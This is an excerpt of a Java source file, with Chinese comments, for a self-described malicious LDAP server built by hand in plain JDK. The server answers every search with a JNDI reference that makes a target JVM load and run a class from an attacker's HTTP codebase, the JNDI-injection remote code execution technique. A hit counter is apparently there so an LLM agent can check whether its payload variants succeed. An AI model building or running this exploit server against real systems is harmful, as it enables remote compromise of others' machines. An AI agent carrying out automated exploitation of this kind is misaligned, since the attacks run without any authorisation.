 ...
 * 恶意 LDAP 服务器
 *
 * 用纯 JDK 手工实现 LDAP TCP 服务端，实现了对任何 SearchRequest 都返回一条 javaNamingReference 记录，引导目标 JVM 从攻击机 HTTP codebase 远程加载类
 *
 * 报文结构使用 ASN.1 BER 和 TLV 嵌套
 */
public class MaliciousLDAPServer {

    // 收到的 SearchRequest 总数，LLM 可判断 payload 变体是否命中
    private static volatile int searchHits = 0;

    public static int getSearchHits() {
        return searchHits;
    }

    public static void resetSearchHits() {
        searchHits = 0;
    }
    ...
    /** LDAPMessage 外层：SEQUENCE { INTEGER messageID, protocolOp } */
    ...
    static byte[] searchResultEntry(String className, String codebase) {
        ...
        ByteArrayOutputStream body = new ByteArrayOutputStream();
        body.write(0x04); body.write(0x00);                      // objectName = ""，必须是空
    ...
    public static ServerSocket start(int port, String codebase, String className) throws IOException {
        ...
        Thread acceptor = new Thread(() -> {
            while (true) {
                try {
                    ...
                    Thread worker = new Thread(() -> handleConnection(conn, cb, className));
        ...
        // daemon：被 Agent 等进程内嵌使用时，不阻塞宿主 JVM 退出
